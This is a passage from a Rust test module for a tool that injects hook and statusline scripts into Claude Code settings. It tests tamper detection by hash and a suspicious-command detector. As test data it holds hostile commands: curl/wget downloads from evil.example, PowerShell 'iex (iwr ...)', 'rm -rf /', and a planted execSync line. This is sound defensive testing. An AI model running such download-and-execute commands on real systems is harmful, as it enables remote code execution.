        std::fs::write(&path, "const SCRIPT_VERSION = 3;\n// other code\n").unwrap();
        assert_eq!(disk_script_version(&path), Some(3));
    }

    #[test]
    fn disk_version_no_version() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.js");
        std::fs::write(&path, "// no version here\n").unwrap();
        assert_eq!(disk_script_version(&path), None);
    }

    #[test]
    fn disk_version_missing_file() {
        assert_eq!(
            disk_script_version(std::path::Path::new("/nonexistent/file.js")),
            None
        );
    }

    #[test]
    fn disk_version_with_spaces_and_semicolon() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("test.js");
        std::fs::write(&path, "  const SCRIPT_VERSION  =  42  ;  \n").unwrap();
        assert_eq!(disk_script_version(&path), Some(42));
    }

    // ── SEC-13 脚本内容哈希比对 ──

    #[test]
    fn sha256_digest_known_vector() {
        // SHA-256 官方测试向量：sha256("abc") = ba7816bf...
        let digest = sha256_digest(b"abc");
        let hex: String = digest.iter().map(|b| format!("{:02x}", b)).collect();
        assert_eq!(
            hex,
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
    }

    #[test]
    fn disk_script_matches_template_when_content_equal() {
        // 磁盘内容 = 模板 → 哈希一致
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("slterm-hook-reporter.js");
        std::fs::write(&path, HOOK_SCRIPT_TEMPLATE.as_bytes()).unwrap();
        assert!(disk_script_matches_template(&path));
    }

    #[test]
    fn disk_script_matches_template_missing_file_false() {
        // 文件缺失 → false（不 panic）
        assert!(!disk_script_matches_template(std::path::Path::new(
            "/nonexistent/reporter.js"
        )));
    }

    #[test]
    fn tampered_script_with_matching_first_line_detected_outdated() {
        // SEC-13 验收：磁盘脚本被替换为首行版本号匹配的恶意文件——
        // 版本文本比对（首行 SCRIPT_VERSION）无法识别，哈希比对必须检出 Outdated
        let (_dir, settings_path, script_dir) = make_inject_env();
        let script_path = script_dir.join("slterm-hook-reporter.js");
        std::fs::create_dir_all(&script_dir).unwrap();
        // 注入正常状态（脚本 = 模板 + settings 含 matcher + statusLine 桥接）→ Injected
        inject_impl(&settings_path, &script_dir).unwrap();
        let s = injection_status_impl(&script_path, &settings_path);
        assert_eq!(s.status, AgentInjectionStatus::Injected);

        // 篡改：首行版本号与模板一致（旧文本比对会放行），内容追加恶意代码
        std::fs::write(
            &script_path,
            format!(
                "const SCRIPT_VERSION = {};\nrequire('child_process').execSync('calc');\n",
                template_version()
            ),
        )
        .unwrap();
        let s = injection_status_impl(&script_path, &settings_path);
        assert_eq!(
            s.status,
            AgentInjectionStatus::Outdated,
            "首行匹配的恶意替换文件应被哈希比对检出 Outdated"
        );
        // version 字段 = 磁盘解析的 SCRIPT_VERSION（诊断用，不参与判定）
        assert_eq!(s.version, Some(template_version()));
    }

    #[test]
    fn tampered_script_without_version_line_detected_outdated() {
        // 磁盘脚本完全替换（无 SCRIPT_VERSION 行）→ 哈希不一致 → Outdated
        let (_dir, settings_path, script_dir) = make_inject_env();
        let script_path = script_dir.join("slterm-hook-reporter.js");
        inject_impl(&settings_path, &script_dir).unwrap();
        std::fs::write(&script_path, "// malicious replacement\n").unwrap();
        let s = injection_status_impl(&script_path, &settings_path);
        assert_eq!(s.status, AgentInjectionStatus::Outdated);
        assert_eq!(s.version, None);
    }

    // ── remove_slterm_matchers ──

    #[test]
    fn remove_matchers_cleans_slterm_entries() {
        let mut hooks = serde_json::json!({
            "SessionStart": [
                {"matcher": "", "hooks": [{"type": "command", "command": "node \"slterm-hook-reporter.js\"", "timeout": 5}]},
                {"matcher": "claude", "hooks": [{"type": "command", "command": "echo hello", "timeout": 10}]}
            ]
        })
        .as_object()
        .unwrap()
        .clone();
        let removed = remove_slterm_matchers(&mut hooks);
        assert!(removed);
        let arr = hooks["SessionStart"].as_array().unwrap();
        assert_eq!(arr.len(), 1, "用户 hook 应保留");
        assert_eq!(arr[0]["hooks"][0]["command"], "echo hello");
    }

    #[test]
    fn remove_matchers_cleans_empty_events() {
        let mut hooks = serde_json::json!({
            "SessionStart": [
                {"matcher": "", "hooks": [{"type": "command", "command": "node \"slterm-hook-reporter.js\"", "timeout": 5}]}
            ]
        })
        .as_object()
        .unwrap()
        .clone();
        let removed = remove_slterm_matchers(&mut hooks);
        assert!(removed);
        assert!(!hooks.contains_key("SessionStart"), "空事件键应被清理");
    }

    #[test]
    fn remove_matchers_no_slterm_entries() {
        let mut hooks = serde_json::json!({
            "PreToolUse": [
                {"matcher": "", "hooks": [{"type": "command", "command": "echo x", "timeout": 10}]}
            ]
        })
        .as_object()
        .unwrap()
        .clone();
        let removed = remove_slterm_matchers(&mut hooks);
        assert!(!removed);
        assert!(hooks.contains_key("PreToolUse"));
    }

    #[test]
    fn remove_matchers_keeps_user_handler_in_same_group() {
        // 验收修复：用户自定义 handler 与注入 handler 混入同一 matcher 组时，
        // 仅剔除 slterm handler，用户 handler 与组保留（handler 级剔除，对齐前端粒度）
        let mut hooks = serde_json::json!({
            "SessionStart": [
                {
                    "matcher": "",
                    "hooks": [
                        {"type": "command", "command": "node \"slterm-hook-reporter.js\"", "timeout": 5},
                        {"type": "command", "command": "echo user-hook", "timeout": 10}
                    ]
                }
            ]
        })
        .as_object()
        .unwrap()
        .clone();
        let removed = remove_slterm_matchers(&mut hooks);
        assert!(removed, "组内 handler 剔除应标记 removed（触发写盘）");
        let arr = hooks["SessionStart"].as_array().unwrap();
        assert_eq!(arr.len(), 1, "混组场景组应保留");
        let handlers = arr[0]["hooks"].as_array().unwrap();
        assert_eq!(handlers.len(), 1, "仅 slterm handler 被剔除");
        assert_eq!(handlers[0]["command"], "echo user-hook");
    }

    #[test]
    fn remove_matchers_drops_group_when_all_handlers_slterm() {
        // 同组全部 handler 均为 slterm → 组空 → 整组删除
        let mut hooks = serde_json::json!({
            "SessionStart": [
                {
                    "matcher": "",
                    "hooks": [
                        {"type": "command", "command": "node \"slterm-hook-reporter.js\"", "timeout": 5},
                        {"type": "command", "command": "node \"other/slterm-hook-reporter.js\"", "timeout": 5}
                    ]
                }
            ]
        })
        .as_object()
        .unwrap()
        .clone();
        let removed = remove_slterm_matchers(&mut hooks);
        assert!(removed);
        assert!(
            !hooks.contains_key("SessionStart"),
            "全 slterm 组删除后空事件键应被清理"
        );
    }

    // ── inject_matchers ──

    #[test]
    fn inject_adds_10_events() {
        let mut hooks = serde_json::Map::new();
        inject_matchers(
            &mut hooks,
            "/home/user/.slterminal/hooks/slterm-hook-reporter.js",
        );
        // D7 键集合精确匹配：注入后的事件键应恰好等于 HOOK_EVENTS 全集
        let mut keys: Vec<&str> = hooks.keys().map(|k| k.as_str()).collect();
        keys.sort_unstable();
        let mut expected: Vec<&str> = HOOK_EVENTS.to_vec();
        expected.sort_unstable();
        assert_eq!(keys, expected, "注入的事件键应恰好等于 HOOK_EVENTS 全集");
        // 结构断言：每事件 handler 数组含 {type:"command", timeout:5, command 含 slterm-hook-reporter}
        for &event in HOOK_EVENTS {
            let matchers = hooks[event].as_array().unwrap();
            assert_eq!(matchers.len(), 1, "事件 {event} 应恰好 1 个 matcher 组");
            let matcher = &matchers[0];
            assert_eq!(matcher["matcher"], "", "事件 {event} matcher 应为空串");
            assert_eq!(
                matcher.as_object().unwrap().len(),
                2,
                "事件 {event} matcher 应恰好 matcher/hooks 两键（D7 键集合）"
            );
            let handlers = matcher["hooks"].as_array().unwrap();
            assert_eq!(handlers.len(), 1, "事件 {event} 应恰好 1 个 handler");
            let handler = &handlers[0];
            assert_eq!(
                handler.as_object().unwrap().len(),
                3,
                "事件 {event} handler 应恰好 type/command/timeout 三键（D7 键集合）"
            );
            assert_eq!(handler["type"], "command", "事件 {event} handler type");
            assert_eq!(handler["timeout"], 5, "事件 {event} handler timeout");
            let cmd = handler["command"].as_str().unwrap();
            assert!(
                cmd.contains("slterm-hook-reporter"),
                "事件 {event} command 应含 slterm-hook-reporter: {cmd}"
            );
        }
    }

    #[test]
    fn inject_preserves_existing_user_matchers() {
        let mut hooks = serde_json::json!({
            "PreToolUse": [
                {"matcher": "custom", "hooks": [{"type": "command", "command": "my-hook.sh", "timeout": 30}]}
            ]
        })
        .as_object()
        .unwrap()
        .clone();
        inject_matchers(&mut hooks, "/tmp/slterm-hook-reporter.js");
        // PreToolUse 现在应有 2 个 entry: 用户自定义 + slterm
        let arr = hooks["PreToolUse"].as_array().unwrap();
        assert_eq!(arr.len(), 2);
        // 用户 entry 应在前面
        assert_eq!(arr[0]["hooks"][0]["command"], "my-hook.sh");
        // slterm entry 应在后面（含子串标识）
        let cmd = arr[1]["hooks"][0]["command"].as_str().unwrap();
        assert!(cmd.contains("slterm-hook-reporter"));
    }

    #[test]
    fn inject_idempotent() {
        let mut hooks = serde_json::Map::new();
        inject_matchers(&mut hooks, "/tmp/slterm-hook-reporter.js");
        let len_after_first = hooks["SessionStart"].as_array().unwrap().len();
        // 二次注入不追加重复
        inject_matchers(&mut hooks, "/tmp/slterm-hook-reporter.js");
        let len_after_second = hooks["SessionStart"].as_array().unwrap().len();
        assert_eq!(
            len_after_first, len_after_second,
            "二次注入不应产生重复 matcher"
        );
    }

    // ── build_matcher_entry ──

    #[test]
    fn matcher_entry_timeout_is_5() {
        let entry = build_matcher_entry("/tmp/slterm-hook-reporter.js");
        assert_eq!(entry["hooks"][0]["timeout"], 5);
        assert_eq!(entry["matcher"], "");
        assert_eq!(entry["hooks"][0]["type"], "command");
    }

    // ── 模板内嵌校验 ──

    #[test]
    fn template_is_non_empty() {
        assert!(HOOK_SCRIPT_TEMPLATE.len() > 100, "内嵌脚本模板不应为空");
        assert!(
            HOOK_SCRIPT_TEMPLATE.contains("SLTERM_PANEL_ID"),
            "模板应引用 SLTERM_PANEL_ID 环境变量"
        );
        assert!(
            HOOK_SCRIPT_TEMPLATE.contains("SCRIPT_VERSION"),
            "模板应含版本常量"
        );
    }

    // ── null safety ──

    #[test]
    fn has_matchers_null_hooks_value() {
        // hooks 存在但某个事件的值为 null（非数组）
        let settings = serde_json::json!({"hooks": {"SessionStart": null}});
        assert!(!has_slterm_matchers(&settings));
    }

    // ── handler_contains_slterm（HUK-11） ──

    #[test]
    fn handler_contains_slterm_string_matches() {
        let hook = serde_json::json!({
            "type": "command",
            "command": "node \"C:/x/slterm-hook-reporter.js\"",
            "timeout": 5
        });
        assert!(handler_contains_slterm(&hook));
    }

    #[test]
    fn handler_contains_slterm_non_string_command() {
        // command 为非字符串（number/null/缺失）时不应误判为 slterm
        assert!(!handler_contains_slterm(&serde_json::json!({
            "type": "command", "command": 42
        })));
        assert!(!handler_contains_slterm(&serde_json::json!({
            "type": "command", "command": null
        })));
        assert!(!handler_contains_slterm(&serde_json::json!({
            "type": "command"
        })));
        // 字符串但不含 slterm-hook-reporter 子串 → false
        assert!(!handler_contains_slterm(&serde_json::json!({
            "command": "node \"my-hook.js\""
        })));
    }

    // ── 注入/卸载/状态 impl（路径可注入，tempdir 驱动——HUK-02） ──

    /// 构造注入场景环境：settings.json 初始不存在（首次注入场景），全部落在 tempdir 内
    fn make_inject_env() -> (tempfile::TempDir, std::path::PathBuf, std::path::PathBuf) {
        let dir = tempfile::tempdir().unwrap();
        let settings_path = dir
            .path()
            .join("home")
            .join(".claude")
            .join("settings.json");
        let script_dir = dir.path().join("home").join(".slterminal").join("hooks");
        (dir, settings_path, script_dir)
    }

    /// 断言 settings.json 已按 C9 注入 10 事件 matcher + statusLine 桥接（返回解析后的 settings）
    fn assert_injected_settings(settings_path: &std::path::Path) -> Value {
        let content = std::fs::read_to_string(settings_path).unwrap();
        let settings: Value = serde_json::from_str(&content).unwrap();
        let hooks = settings["hooks"].as_object().unwrap();
        assert_eq!(hooks.len(), 10, "应注入恰好 10 个事件");
        for &event in HOOK_EVENTS {
            let arr = hooks[event].as_array().unwrap();
            assert_eq!(arr.len(), 1, "事件 {event} 应恰好 1 个 matcher");
            assert_eq!(arr[0]["matcher"], "", "事件 {event} matcher 应为空串");
            assert_eq!(arr[0]["hooks"][0]["type"], "command");
            assert_eq!(arr[0]["hooks"][0]["timeout"], 5);
            assert!(
                arr[0]["hooks"][0]["command"]
                    .as_str()
                    .unwrap()
                    .contains("slterm-hook-reporter"),
                "事件 {event} command 应含 slterm-hook-reporter"
            );
        }
        // statusLine 键 = 桥接（command 含 slterm-statusline；type = command）
        let status_line = settings["statusLine"].as_object().unwrap();
        assert_eq!(
            status_line["type"], "command",
            "statusLine type 应为 command"
        );
        assert!(
            status_line["command"]
                .as_str()
                .unwrap()
                .contains("slterm-statusline"),
            "statusLine command 应含 slterm-statusline"
        );
        settings
    }

    #[test]
    fn inject_impl_basic() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        let status = inject_impl(&settings_path, &script_dir).unwrap();
        assert_eq!(status.status, AgentInjectionStatus::Injected);
        assert_eq!(status.version, Some(template_version()));
        // 脚本已落盘且内容为内嵌模板
        let script_path = script_dir.join("slterm-hook-reporter.js");
        assert!(script_path.is_file(), "脚本应写入脚本目录");
        assert_eq!(
            std::fs::read_to_string(&script_path).unwrap(),
            HOOK_SCRIPT_TEMPLATE
        );
        // settings.json 已按 C9 merge 注入
        assert_injected_settings(&settings_path);
    }

    #[test]
    fn inject_impl_preserves_other_settings_fields() {
        // 既有 settings 的其他字段（permissions/env）在 merge 后原样保留
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"permissions":{"allow":["bash"]},"env":{"K":"v"}}"#,
        )
        .unwrap();
        inject_impl(&settings_path, &script_dir).unwrap();
        let settings = assert_injected_settings(&settings_path);
        assert_eq!(
            settings["permissions"]["allow"][0], "bash",
            "merge 应保留 permissions 字段"
        );
        assert_eq!(settings["env"]["K"], "v", "merge 应保留 env 字段");
    }

    #[test]
    fn inject_impl_idempotent() {
        // 二次注入不产生重复 matcher（每事件仍恰好 1 个）
        let (_dir, settings_path, script_dir) = make_inject_env();
        inject_impl(&settings_path, &script_dir).unwrap();
        inject_impl(&settings_path, &script_dir).unwrap();
        let settings = assert_injected_settings(&settings_path);
        for &event in HOOK_EVENTS {
            let arr = settings["hooks"][event].as_array().unwrap();
            assert_eq!(arr.len(), 1, "事件 {event} 二次注入后不应出现重复 matcher");
        }
    }

    #[test]
    fn inject_impl_illegal_json_aborts_without_modify() {
        // 非法 JSON 中止：返回 Err 且不改动原文件（C9）
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        let original = b"{ this is not valid json !!".to_vec();
        std::fs::write(&settings_path, &original).unwrap();
        let err = inject_impl(&settings_path, &script_dir).unwrap_err();
        assert!(
            err.to_string().contains("格式错误"),
            "错误信息应说明格式错误: {err}"
        );
        assert_eq!(
            std::fs::read(&settings_path).unwrap(),
            original,
            "非法 JSON 中止时不应改动原文件"
        );
    }

    #[test]
    fn inject_impl_non_object_root_aborts() {
        // 根为数组/标量无法安全 merge → 中止且不改动文件
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(&settings_path, "[1,2,3]").unwrap();
        assert!(inject_impl(&settings_path, &script_dir).is_err());
        assert_eq!(
            std::fs::read_to_string(&settings_path).unwrap(),
            "[1,2,3]",
            "根非对象时不应改动文件"
        );
    }

    #[test]
    fn inject_impl_non_object_hooks_aborts() {
        // hooks 段非对象 → 中止
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(&settings_path, r#"{"hooks": [1,2]}"#).unwrap();
        assert!(inject_impl(&settings_path, &script_dir).is_err());
    }

    #[test]
    fn uninstall_impl_mixed_group_keeps_user_handler() {
        // 混组场景：同一 matcher 组内 slterm handler + 用户 handler → 仅删 slterm、
        // 用户 handler 与组保留（handler 级剔除）；用户 matcher 整体保留；目录删除
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{
                "hooks": {
                    "SessionStart": [{
                        "matcher": "",
                        "hooks": [
                            {"type": "command", "command": "node \"C:/x/slterm-hook-reporter.js\"", "timeout": 5},
                            {"type": "command", "command": "echo user-hook", "timeout": 10}
                        ]
                    }],
                    "PreToolUse": [{
                        "matcher": "custom",
                        "hooks": [{"type": "command", "command": "my-hook.sh", "timeout": 30}]
                    }]
                }
            }"#,
        )
        .unwrap();
        std::fs::create_dir_all(&script_dir).unwrap();
        std::fs::write(
            script_dir.join("slterm-hook-reporter.js"),
            "const SCRIPT_VERSION = 1;",
        )
        .unwrap();
        let events_dir = script_dir.parent().unwrap().join("hooks-events");
        std::fs::create_dir_all(&events_dir).unwrap();
        std::fs::write(events_dir.join("evt.json"), "{}").unwrap();

        uninstall_impl(Some(&settings_path), Some(&script_dir), Some(&events_dir)).unwrap();

        // settings：混组保用户 handler、组保留；用户 matcher 保留
        let settings: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        let hooks = settings["hooks"].as_object().unwrap();
        let session = hooks["SessionStart"].as_array().unwrap();
        assert_eq!(session.len(), 1, "混组场景组应保留");
        let handlers = session[0]["hooks"].as_array().unwrap();
        assert_eq!(handlers.len(), 1, "仅 slterm handler 被剔除");
        assert_eq!(handlers[0]["command"], "echo user-hook");
        let pre = hooks["PreToolUse"].as_array().unwrap();
        assert_eq!(
            pre[0]["hooks"][0]["command"], "my-hook.sh",
            "用户 matcher 应保留"
        );
        // 目录已删除
        assert!(!script_dir.exists(), "脚本目录应被删除");
        assert!(!events_dir.exists(), "信号目录应被删除");
    }

    #[test]
    fn uninstall_impl_all_slterm_removes_hooks_key() {
        // 注入后整体卸载：10 事件全 slterm → hooks 键整体移除 + 目录删除
        let (_dir, settings_path, script_dir) = make_inject_env();
        inject_impl(&settings_path, &script_dir).unwrap();
        let events_dir = script_dir.parent().unwrap().join("hooks-events");
        std::fs::create_dir_all(&events_dir).unwrap();
        uninstall_impl(Some(&settings_path), Some(&script_dir), Some(&events_dir)).unwrap();
        let settings: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        assert!(
            settings.get("hooks").is_none(),
            "全 slterm 卸载后 hooks 键应整体移除"
        );
        assert!(!script_dir.exists());
        assert!(!events_dir.exists());
    }

    #[test]
    fn uninstall_impl_illegal_json_skips_config_but_deletes_dirs() {
        // 非法 JSON → 静默跳过配置清理（文件原样），目录仍删除
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        let original = b"{ invalid !!".to_vec();
        std::fs::write(&settings_path, &original).unwrap();
        std::fs::create_dir_all(&script_dir).unwrap();
        let events_dir = script_dir.parent().unwrap().join("hooks-events");
        std::fs::create_dir_all(&events_dir).unwrap();
        uninstall_impl(Some(&settings_path), Some(&script_dir), Some(&events_dir)).unwrap();
        assert_eq!(
            std::fs::read(&settings_path).unwrap(),
            original,
            "非法 JSON 时配置清理应跳过"
        );
        assert!(!script_dir.exists(), "脚本目录仍应删除");
        assert!(!events_dir.exists(), "信号目录仍应删除");
    }

    #[test]
    fn status_impl_three_states() {
        // 状态三态：NotInjected / Injected / Outdated（脚本版本 vs 模板版本比对）
        let (_dir, settings_path, script_dir) = make_inject_env();
        let script_path = script_dir.join("slterm-hook-reporter.js");

        // ① 脚本不存在 → NotInjected
        let s = injection_status_impl(&script_path, &settings_path);
        assert_eq!(s.status, AgentInjectionStatus::NotInjected);

        // ② 注入后（脚本版本与模板一致 + settings 含 matcher）→ Injected
        inject_impl(&settings_path, &script_dir).unwrap();
        let s = injection_status_impl(&script_path, &settings_path);
        assert_eq!(s.status, AgentInjectionStatus::Injected);
        assert_eq!(s.version, Some(template_version()));

        // ③ 磁盘脚本版本 ≠ 模板版本 → Outdated（version 为磁盘版本）
        std::fs::write(
            &script_path,
            format!("const SCRIPT_VERSION = {};\n", template_version() + 1),
        )
        .unwrap();
        let s = injection_status_impl(&script_path, &settings_path);
        assert_eq!(s.status, AgentInjectionStatus::Outdated);
        assert_eq!(s.version, Some(template_version() + 1));

        // ④ settings 无 slterm matcher → NotInjected
        std::fs::write(
            &script_path,
            format!("const SCRIPT_VERSION = {};\n", template_version()),
        )
        .unwrap();
        std::fs::write(&settings_path, "{}").unwrap();
        let s = injection_status_impl(&script_path, &settings_path);
        assert_eq!(s.status, AgentInjectionStatus::NotInjected);
    }

    // ── statusline 桥接（context 官方用量百分比通道）──

    #[test]
    fn statusline_template_is_non_empty_and_contains_contract() {
        assert!(
            STATUSLINE_SCRIPT_TEMPLATE.len() > 100,
            "桥接脚本模板不应为空"
        );
        assert!(
            STATUSLINE_SCRIPT_TEMPLATE.contains("used_percentage"),
            "桥接脚本应提取官方 used_percentage 字段"
        );
        assert!(
            STATUSLINE_SCRIPT_TEMPLATE.contains("SLTERM_PANEL_ID"),
            "桥接脚本应引用 SLTERM_PANEL_ID 环境变量"
        );
        assert!(
            STATUSLINE_SCRIPT_TEMPLATE.contains("slterm-statusline"),
            "桥接脚本应含自身文件名（桥接判定子串）"
        );
        assert!(
            STATUSLINE_SCRIPT_TEMPLATE.contains(r#"cliId: "claude""#),
            "桥接脚本信号 payload 应显式写 cliId（决策 7 先例）"
        );
        assert!(
            STATUSLINE_SCRIPT_TEMPLATE.contains(r#"event: "ContextUsage""#),
            "桥接脚本信号 event 应为 ContextUsage"
        );
        assert!(
            STATUSLINE_SCRIPT_TEMPLATE.contains("SCRIPT_VERSION"),
            "桥接脚本应含版本常量"
        );
        assert!(
            STATUSLINE_SCRIPT_TEMPLATE.contains("[slterm-statusline: 命令执行失败]"),
            "桥接脚本透传失败应输出占位文本（B11）"
        );
        // B16：bash 候选定位（PATH 的 bash 缺失时经 git 推导同根 Git\bin\bash.exe）
        // 与反斜杠转正斜杠（bash -c 词法吃反斜杠致 127）
        assert!(
            STATUSLINE_SCRIPT_TEMPLATE.contains("bashCandidates"),
            "桥接脚本应含 bash 候选定位函数（B16：Windows PATH 通常无 bash）"
        );
        assert!(
            STATUSLINE_SCRIPT_TEMPLATE.contains(r#"Program Files\\Git\\bin\\bash.exe"#),
            "桥接脚本应含固定路径 fallback（Program Files\\Git\\bin\\bash.exe）"
        );
        assert!(
            STATUSLINE_SCRIPT_TEMPLATE.contains(r#"replace(/\\/g, "/")"#),
            "桥接脚本 bash 分支应将反斜杠转正斜杠（B16：bash -c 词法转义）"
        );
    }

    #[test]
    fn inject_writes_statusline_script_and_bridge_config() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        // 预置用户原 statusLine（非桥接）
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"~/.claude/statusline-user.sh"}}"#,
        )
        .unwrap();

        inject_impl(&settings_path, &script_dir).unwrap();

        // 桥接脚本已落盘且内容为内嵌模板
        let bridge_path = script_dir.join(STATUSLINE_SCRIPT_NAME);
        assert!(bridge_path.is_file(), "桥接脚本应落盘");
        assert_eq!(
            std::fs::read_to_string(&bridge_path).unwrap(),
            STATUSLINE_SCRIPT_TEMPLATE
        );
        // statusLine = 桥接 + 原命令内嵌（argv 透传给桥接脚本）
        let settings: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        let cmd = settings["statusLine"]["command"].as_str().unwrap();
        assert!(cmd.contains("slterm-statusline"), "command 应为桥接: {cmd}");
        assert!(
            cmd.contains("~/.claude/statusline-user.sh"),
            "原命令应作为 argv 透传: {cmd}"
        );
        // 备份文件 = 原配置
        let backup = backup_path_from_script_dir(&script_dir).unwrap();
        let backup_value: Value =
            serde_json::from_str(&std::fs::read_to_string(&backup).unwrap()).unwrap();
        assert_eq!(
            backup_value,
            serde_json::json!({"type":"command","command":"~/.claude/statusline-user.sh"}),
            "备份应为原 statusLine 配置"
        );
    }

    #[test]
    fn inject_without_original_statusline_skips_backup_but_injects_bridge() {
        let (_dir, settings_path, script_dir) = make_inject_env();
        inject_impl(&settings_path, &script_dir).unwrap();
        // 无原配置 → 不备份
        let backup = backup_path_from_script_dir(&script_dir).unwrap();
        assert!(!backup.exists(), "无原 statusLine 不应产生备份");
        // 桥接仍注入（原命令空——纯信号上报形态）
        assert_injected_settings(&settings_path);
    }

    // ── B11 包裹形态解包（损坏中间态注入防御） ──

    #[test]
    fn unwrap_wrapped_statusline_single_layer() {
        // 单层 reporter 包裹（损坏中间态形态）→ 解出内层命令
        let cmd = "node \"C:/Users/x/.slterminal/hooks/slterm-hook-reporter.js\" \"~/.claude/statusline-deepseek.sh\"";
        assert_eq!(
            unwrap_wrapped_statusline(cmd),
            Some("~/.claude/statusline-deepseek.sh".to_string())
        );
    }

    #[test]
    fn unwrap_wrapped_statusline_double_layer() {
        // 双层包裹（statusline 包 reporter）→ 解到最内层
        let cmd = "node \"C:/x/.slterminal/hooks/slterm-statusline.js\" \"node \\\"C:/x/.slterminal/hooks/slterm-hook-reporter.js\\\" \\\"~/.claude/statusline-deepseek.sh\\\"\"";
        assert_eq!(
            unwrap_wrapped_statusline(cmd),
            Some("~/.claude/statusline-deepseek.sh".to_string())
        );
    }

    #[test]
    fn unwrap_wrapped_statusline_not_wrap() {
        // 普通用户原配置（非包裹形态）→ None（调用方按原样处理）
        assert_eq!(
            unwrap_wrapped_statusline("~/.claude/statusline-user.sh"),
            None
        );
    }

    #[test]
    fn unwrap_wrapped_statusline_foreign_node_wrap() {
        // 用户自写 node 包裹（脚本路径无自有脚本名）→ None 不误伤
        assert_eq!(
            unwrap_wrapped_statusline("node \"my-own-script.js\" \"--flag\""),
            None
        );
    }

    // ── SEC-12 statusline 原命令可疑模式审查 ──

    #[test]
    fn suspicious_pattern_detects_downloaders_and_iex() {
        // 下载器 curl/wget 与 PowerShell 任意执行系命中
        assert_eq!(
            suspicious_statusline_pattern("curl -o /tmp/x https://evil.example/x.sh"),
            Some("curl")
        );
        assert_eq!(
            suspicious_statusline_pattern("wget https://evil/x"),
            Some("wget")
        );
        assert_eq!(
            suspicious_statusline_pattern(
                "powershell -c Invoke-Expression (New-Object Net.WebClient).DownloadString(...)"
            ),
            Some("Invoke-Expression")
        );
        assert_eq!(
            suspicious_statusline_pattern("pwsh -c iex (iwr https://evil/x)"),
            Some("iex")
        );
        assert_eq!(
            suspicious_statusline_pattern("Invoke-WebRequest https://evil/x -OutFile t.ps1"),
            Some("Invoke-WebRequest")
        );
        // 命令可执行文件形态（.exe 后缀）仍命中——curl.exe 即 curl
        assert_eq!(
            suspicious_statusline_pattern("curl.exe -k https://evil"),
            Some("curl")
        );
    }

    #[test]
    fn suspicious_pattern_ignores_normal_commands() {
        // 普通 statusline 命令（脚本路径/内置命令）不命中
        assert_eq!(
            suspicious_statusline_pattern("~/.claude/statusline-user.sh"),
            None
        );
        assert_eq!(suspicious_statusline_pattern("echo hello"), None);
        assert_eq!(
            suspicious_statusline_pattern("node ~/hud/statusline.js"),
            None
        );
    }

    #[test]
    fn suspicious_pattern_word_boundary_no_false_positive() {
        // 词边界：变量名/路径中的子串不误报（curl 前邻字母数字不命中）
        assert_eq!(
            suspicious_statusline_pattern("node ~/mycurl/statusline.js"),
            None,
            "路径分量 mycurl 不应误报 curl"
        );
        assert_eq!(
            suspicious_statusline_pattern("$MYCURLPATH"),
            None,
            "变量名 MYCURLPATH 不应误报 curl"
        );
        assert_eq!(
            suspicious_statusline_pattern("node statusline-curling.js"),
            None,
            "文件名 statusline-curling 不应误报 curl"
        );
    }

    #[test]
    fn suspicious_pattern_case_insensitive() {
        // 大小写不敏感：CURL/Invoke-WebRequest 任意大小写组合命中
        assert_eq!(suspicious_statusline_pattern("CURL -s evil"), Some("curl"));
        assert_eq!(
            suspicious_statusline_pattern("invoke-expression 'rm -rf /'"),
            Some("Invoke-Expression")
        );
        assert_eq!(
            suspicious_statusline_pattern("IWR https://evil/x"),
            Some("iwr")
        );
    }

    #[test]
    fn inject_impl_suspicious_statusline_warns_but_injects() {
        // 信任边界验证：原命令命中可疑模式时注入仍成功（仅记录不阻断——SEC-12）
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        std::fs::write(
            &settings_path,
            r#"{"statusLine":{"type":"command","command":"curl -o ~/.claude/evil.sh https://evil.example/x.sh"}}"#,
        )
        .unwrap();

        inject_impl(&settings_path, &script_dir).unwrap();

        // 注入成功：桥接已建、原命令作为 argv 透传（未被阻断/改写）
        let settings: Value =
            serde_json::from_str(&std::fs::read_to_string(&settings_path).unwrap()).unwrap();
        let cmd = settings["statusLine"]["command"].as_str().unwrap();
        assert!(cmd.contains("slterm-statusline"), "桥接应正常注入: {cmd}");
        assert!(
            cmd.contains("curl -o ~/.claude/evil.sh https://evil.example/x.sh"),
            "原命令应原样透传（不阻断不改写）: {cmd}"
        );
    }

    #[test]
    fn reinject_impl_suspicious_statusline_warns_but_reinjects() {
        // 重注入路径同样不阻断：备份原命令命中可疑模式 → 桥接重注入成功
        let (_dir, settings_path, script_dir) = make_inject_env();
        std::fs::create_dir_all(settings_path.parent().unwrap()).unwrap();
        let original =
            r#"{"statusLine":{"type":"command","command":"wget -O /tmp/x https://evil/x"}}"#;
        std::fs::write(&settings_path, original).unwrap();
        inject_impl(&settings_path, &script_dir).unwrap();
        let backup = backup_path_from_script_dir(&script_dir).unwrap();
        restore_statusline_impl(Some(&settings_path), Some(&backup)).unwrap();

        reinject_statusline_impl(
            Some(&settings_path),
            Some(&backup),
            Some(&script_dir.join(STATUSLINE_SCRIPT_NAME)),
        )
        .unwrap();

        let settings: Value =
